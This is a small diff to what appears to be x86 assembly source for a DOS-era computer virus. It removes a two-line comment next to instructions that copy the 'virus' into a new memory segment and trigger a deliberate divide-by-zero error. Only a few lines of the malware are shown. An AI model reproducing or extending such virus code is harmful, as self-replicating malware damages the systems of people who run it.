@@ -44,8 +44,6 @@ Prefetch        EQU      $-2
           rep     movsb                       ;Move virus to new segment
           mov     ds,ax
           div     cx                          ;Invoke divide-by-0 error.
-                                              ; Read notes above for
-                                              ; explanation.
 
 ; NOTE: All code following this point is executed in the higher segment
 
